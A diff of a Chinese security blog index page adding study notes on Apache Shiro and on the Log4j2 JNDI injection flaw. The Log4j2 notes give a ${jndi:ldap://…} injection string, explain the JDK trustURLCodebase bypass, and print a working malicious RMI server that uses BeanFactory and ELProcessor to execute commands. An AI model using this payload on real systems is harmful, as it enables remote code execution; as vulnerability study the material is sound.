@@ -188,6 +188,284 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/27/shiro%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/../images/avatar.PNG">
+      <meta itemprop="name" content="blueSatchel">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blueSatchel's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/09/27/shiro%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">shiro简单学习记录</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-09-27 15:47:02 / 修改时间：20:01:03" itemprop="dateCreated datePublished" datetime="2022-09-27T15:47:02+08:00">2022-09-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/09/27/shiro%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/09/27/shiro%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>先来一个简单的登录认证小例子</p>
+<p>编一个ini文件模拟数据库中获取的数据</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220927171547699.png" alt="image-20220927171547699"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.SecurityUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.AuthenticationException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.AuthenticationToken;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.UsernamePasswordToken;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.config.IniSecurityManagerFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.mgt.SecurityManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.Subject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShiroRun</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//1.初始化获取SecurityManager</span></span><br><span class="line">        IniSecurityManagerFactory factory =<span class="keyword">new</span> IniSecurityManagerFactory(<span class="string">&quot;classpath:shiro.ini&quot;</span>);</span><br><span class="line">        SecurityManager securityManager=factory.getInstance();</span><br><span class="line">        SecurityUtils.setSecurityManager(securityManager);</span><br><span class="line">        <span class="comment">//2.获取subject对象</span></span><br><span class="line">        Subject subject=SecurityUtils.getSubject();</span><br><span class="line">        <span class="comment">//3.创建token对象,web应用用户名密码从页面传递</span></span><br><span class="line">        AuthenticationToken token=<span class="keyword">new</span> UsernamePasswordToken(<span class="string">&quot;zhangsan&quot;</span>,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="comment">//4.完成登录</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            subject.login(token);</span><br><span class="line">            System.out.println(<span class="string">&quot;登录成功&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AuthenticationException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;登录失败&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//异常还有很多种,这里笼统的写一个就行了</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="授权概念"><a href="#授权概念" class="headerlink" title="授权概念"></a>授权概念</h3><p>1.授权,也叫访问控制,即在应用中控制谁访问哪些资源(如访问页面/编辑数据/页面操作等).在授权中需了解的几个关键对象:主体(subject),资源(Resource),权限(permission),角色(role)</p>
+<p>2.主体(Subject):访问应用的用户,在Shiro中使用subject代表该用户,用户只有授权后才能访问相应的资源</p>
+<p>3.资源(Resource):在应用中用户可以访问的URL,比如访问JSP页面,查看/编辑某些数据,访问某个业务方法,打印文本等等都是资源,用户需要授权后才能访问</p>
+<p>3.权限(permission):安全策略中的原子授权单位,通过权限我们可以表示在应用中用户有没有操作某个资源的权利,即权限表示在应用中用户能不能访问某个资源,如:访问用户列表页面查看/新增/修改/删除用户数据(即很多时候都是CRUD)增删改查式权限控制等</p>
+<p>5.shiro支持粗粒度权限(如用户模块的所有权限)和细粒度权限(操作某个用户的权限,即实例级别的)</p>
+<p>6.角色(role):权限的集合,一般情况下会赋予用户角色而不是权限,即这样用户可以拥有一组权限,赋予权限时比较方便,典型的如:项目经理,技术总监,CTO,开发工程师等都是角色,不同的角色拥有一组不同的权限</p>
+<h4 id="授权方式"><a href="#授权方式" class="headerlink" title="授权方式"></a>授权方式</h4><h5 id="1-编程方式"><a href="#1-编程方式" class="headerlink" title="1.编程方式"></a>1.编程方式</h5><p>通过写if/else授权代码块完成</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(subject.hasRole(<span class="string">&quot;admin&quot;</span>))&#123;</span><br><span class="line">    <span class="comment">//有权限</span></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//无权限</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-注解式"><a href="#2-注解式" class="headerlink" title="2.注解式"></a>2.注解式</h5><p>通过在执行的java方法上防止相应的注解完成,没有权限将抛出相应的已换成那个</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequireRoles(&quot;admin&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="3-JSP-GSP标签"><a href="#3-JSP-GSP标签" class="headerlink" title="3.JSP/GSP标签"></a>3.JSP/GSP标签</h5><p>在jsp/gsp页面通过相应的标签完成</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;shiro:hasRole name=<span class="string">&quot;admin&quot;</span>&gt;</span><br><span class="line">    有权限</span><br><span class="line">&lt;/shiro:hasRole&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="授权流程"><a href="#授权流程" class="headerlink" title="授权流程"></a>授权流程</h4><p>subject.isPermitted/hasRole</p>
+<h3 id="自定义登录认证"><a href="#自定义登录认证" class="headerlink" title="自定义登录认证"></a>自定义登录认证</h3><h3 id="与SpringBoot整合"><a href="#与SpringBoot整合" class="headerlink" title="与SpringBoot整合"></a>与SpringBoot整合</h3><p>3.1框架整合</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/23/log4j2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/../images/avatar.PNG">
+      <meta itemprop="name" content="blueSatchel">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blueSatchel's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/09/23/log4j2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">log4j2漏洞学习记录</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-09-23 14:15:14 / 修改时间：19:18:36" itemprop="dateCreated datePublished" datetime="2022-09-23T14:15:14+08:00">2022-09-23</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/09/23/log4j2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/09/23/log4j2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="lo4gj2漏洞简单学习记录"><a href="#lo4gj2漏洞简单学习记录" class="headerlink" title="lo4gj2漏洞简单学习记录"></a>lo4gj2漏洞简单学习记录</h1><p>log4j2和log4j简单的小区别</p>
+<blockquote>
+<ul>
+<li><p>Log4j2分为2个jar包，一个是接口 log4j-api-版 本 号 . j a r   ， 一 个 是 具 体 实 现   l o g 4 j − c o r e − {版本号}.jar ，一个是具体实现 log4j-core-版本号.jar ，一个是具体实现 log4j−core−{版本号}.jar 。Log4j只有一个jar包 log4j-${版本号}.jar 。</p>
+</li>
+<li><p>Log4j2的版本号目前均为2.x。Log4j的版本号均为1.x。</p>
+</li>
+<li><p>Log4j2的package名称前缀为 org.<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=apache&spm=1001.2101.3001.7020">apache</a>.logging.log4j 。Log4j的package名称前缀为 org.apache.log4j 。</p>
+</li>
+</ul>
+</blockquote>
+<h2 id="jdk低版本"><a href="#jdk低版本" class="headerlink" title="jdk低版本"></a>jdk低版本</h2><p>在低版本jdk中,可以通过ldap和rmi服务构造远程恶意类来让其执行恶意代码</p>
+<p>1、首先攻击者遭到存在风险的接口（接口会将前端输入直接通过日志打印出来），然后向该接口发送攻击内容：${jndi:ldap://localhost:9999/Test}。</p>
+<p>2、被攻击服务器接收到该内容后，通过Logj42工具将其作为日志打印。</p>
+<p>源码：org.apache.logging.slf4j.Log4jLogger.debug(…)/info(…)/error(…)等方法</p>
+<pre><code>        &gt; org.apache.logging.log4j.core.config.LoggerConfig.log(...)
+
+              &gt; AbstractOutputStreamAppender.append(final LogEvent event)
+</code></pre>
+<p>3、此时Log4j2会解析${}，读取出其中的内容。判断其为Ldap实现的JNDI。于是调用Java底层的Lookup方法，尝试完成Ldap的Lookup操作。</p>
+<p>源码：StrSubstitutor.substitute(…) –解析出${}中的内容：jndi:ldap://localhost:9999/Test</p>
+<pre><code>            &gt; StrSubstitutor.resolveVariable(...) --处理解析出的内容，执行lookup
+
+            &gt; Interpolator.lookup(...) --根据jndi找到jndi的处理类
+
+                    &gt; JndiLookup.lookup(...)
+
+                    &gt; JndiManager.lookup(...)
+
+                            &gt; java.naming.InitialContext.lookup(...) --调用Java底层的Lookup方法
+</code></pre>
+<p>后面调用的就是<code>InitialContext.lookup方法</code>从而执行了恶意代码</p>
+<h5 id="低版本攻击原理"><a href="#低版本攻击原理" class="headerlink" title="低版本攻击原理"></a>低版本攻击原理</h5><p>通过上面低版本的原理分析可知，我们根据在Ldap构造了javaFactoryLocation指向Codebase，告诉客户端需要从远端Codebase去获取需要的javaFactory类。获取到之后，然后使其使用本地的类加载器加载远程恶意的javaFactory类的，然后其在加载的过程中执行恶意的static代码块，从而实现攻击。</p>
+<h3 id="jdk对于lookup方法的修复"><a href="#jdk对于lookup方法的修复" class="headerlink" title="jdk对于lookup方法的修复"></a>jdk对于lookup方法的修复</h3><p>RMI的JNDI注入在<code>8u121</code>后限制,需要手动开启<code>com.sun.jndi.rmi.object.trustURLCodebase</code>属性</p>
+<p>RMI的JNDI注入在<code>8u191</code>后限制,需要手动开启<code>com.sun.jndi.rmi.object.trustURLCodebase</code>属性</p>
+<h4 id="限制版本绕过"><a href="#限制版本绕过" class="headerlink" title="限制版本绕过"></a>限制版本绕过</h4><p>RMI的限制是限制了远程的工厂类而不限制本地,所以用本地工厂类触发</p>
+<p>通过<code>org.apache.naming.factory.BeanFactory</code>结合<code>ELProcessor</code>绕过</p>
+<p>LDAP的限制中不对<code>javaSerializedData</code>验证,所以可以打本地<code>gadget</code></p>
+<h3 id="具体代码执行的地方"><a href="#具体代码执行的地方" class="headerlink" title="具体代码执行的地方"></a>具体代码执行的地方</h3><p>在<code>NamingManager.getObjectFactoryFromReference()</code>方法中,如果在默认的classpath加载不到该类</p>
+<p>就会请求reference中的codebase得到class内容并使用类加载器加载,之后通过默认构造函数构造对象</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220922165932132.png" alt="image-20220922165932132"></p>
+<h4 id="什么是codebase"><a href="#什么是codebase" class="headerlink" title="什么是codebase"></a>什么是codebase</h4><p>codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的 CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。</p>
+<h3 id="高版本为何无效"><a href="#高版本为何无效" class="headerlink" title="高版本为何无效"></a>高版本为何无效</h3><p>上述所有操作都必须在JDK8u191之前才可以实现</p>
+<p>在<code>VersionHelper12.loadClass</code>中加了一个对于trustURLCodebase的判断来控制是否允许请求codebase下载对应的class文件,其默认为false</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220922172036555.png" alt="image-20220922172036555"></p>
+<p>可以手动开启trustURLCodebase</p>
+<p><code>System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;, &quot;true&quot;);</code>将其指定为true，</p>
+<h2 id="jdk高版本"><a href="#jdk高版本" class="headerlink" title="jdk高版本"></a>jdk高版本</h2><h3 id="lookup基本功能"><a href="#lookup基本功能" class="headerlink" title="lookup基本功能"></a>lookup基本功能</h3><p>当java底层请求ldap服务之后,ldap主要返回了三个参数javaClassName,javaFactory,javaFactoryLocation,以及一些额外参数,客户端获得这些参数之后主要做一件事情:构造需要的类实例,即客户端通过javaFactory类来构建实现我们需要的javaClassName执行的实例,这个过程中需要注意一下几点</p>
+<ul>
+<li><p>javaFactory类是ObjectFactory的子类</p>
+</li>
+<li><p>javaFactory有两个来源:来自codebase(ldap返回的codebase地址),或者来自本地(ldap返回对应javaFactory的类地址)</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220922174055442.png" alt="image-20220922174055442"></p>
+<ul>
+<li><p>​    对于来自codeabse的Factory:和低版本中的逻辑一样,我们需要请求Codebase获取其class文件,然后加载该Factory类,并使用默认构造函数实例化出Factory实例</p>
+</li>
+<li><p>来自本地的Factory:直接根据ldap返回的路径(类限定符),通过Class.forName进行加载和实例化</p>
+</li>
+</ul>
+</li>
+<li><p>得到javaFactory实例后,我们需要构建通过javaFactory实例构建出JavaClassName指定的对象</p>
+</li>
+<li><p>log4j2通过javaFactory得到对应的对象之后,会调用其toString方法将其转换为字符串,然后用该字符串替换日志中的${…}内容,并且打印出来</p>
+</li>
+</ul>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220922180330569.png" alt="image-20220922180330569"></p>
+<h3 id="高版本如何利用ldap实现攻击"><a href="#高版本如何利用ldap实现攻击" class="headerlink" title="高版本如何利用ldap实现攻击"></a>高版本如何利用ldap实现攻击</h3><p>我们知道高版本已经无法通过codebase获取javaFactory的class文件,所以我们想通过让客户端加载和实例化我们构建的javaFactory来实现攻击是不可能的了</p>
+<p>但是还可以通过ldap实例化本地的javaFactory,并且用本地的javaFactory实例化一个本地存在的类所以现在的问题就是如何找到一个可以被利用的本地javaFactory类</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a></p>
+</blockquote>
+<p>参考文章中提到了tomcat携带的org.apache.naming.factory.BeanFactory类就是一个存在风险的ObjectFactory子类。通过该Factory我们可以通过默认构造函数实例化任意一个类，并调用其任意的只有一个String入参的公共方法，且其方法名可以不用是标准setter的名称，而可以是任意名称。因为我们可以通过forceString来制定某个String变量的setter方法名称。</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220923135856558.png" alt="image-20220923135856558"></p>
+<p>在红框中会强制替换setterName和对应的param名称</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220923140033950.png" alt="image-20220923140033950"></p>
+<p>之后将param和param对应的setter方法放到map  <code>forced</code>中</p>
+<p>并在接下来的代码中进行调用</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220923140150754.png" alt="image-20220923140150754"></p>
+<p>基于此能力,我们就可利用<code>javax.el.ELProcessor</code>类,因为其有默认公开的无参构造方法,还有个eval方法,只有一个String入参,其可以执行EL表达式,从而执行任意指令</p>
+<blockquote>
+<p> 这里埋个伏笔,完事可以尝试使用codeql来查询是否存在这样的类</p>
+</blockquote>
+<p>evilServer</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilRMIServerNew</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Creating evil RMI registry on port 1097&quot;</span>);</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1097</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span></span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        <span class="comment">//expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line">        </span><br><span class="line"> <span class="comment">//这里el表达式是通过&quot;&quot;空字符串.getClass</span></span><br><span class="line"> </span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;Object&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后执行的el表达式长这样</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220923191015111.png" alt="image-20220923191015111"></p>
+<p>通过””的string类型获取到String的class,所有class都继承于Class类,隐含这forName这个加载方法加载类</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220923191700911.png" alt="image-20220923191700911"></p>
+<p>client</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String url=<span class="string">&quot;rmi://127.0.0.1:1097/Object&quot;</span>;</span><br><span class="line">        Context ctx=<span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/31/springboot%E9%98%B2%E5%BE%A1xss%E7%9A%84%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -391,7 +669,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-08-24 23:51:39" itemprop="dateModified" datetime="2022-08-24T23:51:39+08:00">2022-08-24</time>
+                <time title="修改时间：2022-09-09 23:53:09" itemprop="dateModified" datetime="2022-09-09T23:53:09+08:00">2022-09-09</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -965,179 +1243,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/14/codeql%E7%BC%96%E5%86%99cc%E9%93%BE%E6%9F%A5%E8%AF%A2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/../images/avatar.PNG">
-      <meta itemprop="name" content="blueSatchel">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="blueSatchel's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/05/14/codeql%E7%BC%96%E5%86%99cc%E9%93%BE%E6%9F%A5%E8%AF%A2/" class="post-title-link" itemprop="url">codeql编写cc链查询</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-05-14 15:58:37 / 修改时间：16:26:57" itemprop="dateCreated datePublished" datetime="2022-05-14T15:58:37+08:00">2022-05-14</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/codeql/" itemprop="url" rel="index"><span itemprop="name">codeql</span></a>
-                </span>
-            </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2022/05/14/codeql%E7%BC%96%E5%86%99cc%E9%93%BE%E6%9F%A5%E8%AF%A2/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2022/05/14/codeql%E7%BC%96%E5%86%99cc%E9%93%BE%E6%9F%A5%E8%AF%A2/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>有了之前的cc3的数据库,就可以尝试编写cc的反序列化调用链了,在编写ql语句之前,首先需要明确反序列化利用链的几个基础条件</p>
-<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1511/">参考这篇文章</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">序列化利用链的条件:</span><br><span class="line">1. source，入口点，一般就是一个readObject方法</span><br><span class="line">2. sink，执行点，一般是动态方法执行、Jndi注入、写文件之类的   在本次的链中就是invokerTransformer的transform方法</span><br><span class="line">3. gadget，连接source和sink的多个类。有几个条件：</span><br><span class="line">	1). 类之间的方法调用是链式的。</span><br><span class="line">	2). 类实例之间的关系是嵌套的，调用链上后一个类实例是前一个类实例的属性。</span><br><span class="line">	3). 调用链上的类都需要是可以序列化的。</span><br></pre></td></tr></table></figure>
-
-<p>由于codeql无法在多个数据库之间查询流,并且cc的source全是jdk自带类的readObject,万恶之源还得是LazyMap和ChainedTransformer,就暂且以他两作为source,执行点呢就更简单了,就是InvokerTransformer和InstantiareTransformer</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/12/%E4%BD%BF%E7%94%A8codeql%E7%9A%84cc%E9%93%BE%E5%88%86%E6%9E%90/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/../images/avatar.PNG">
-      <meta itemprop="name" content="blueSatchel">
-      <meta itemprop="description" content="">
-    </span>
-
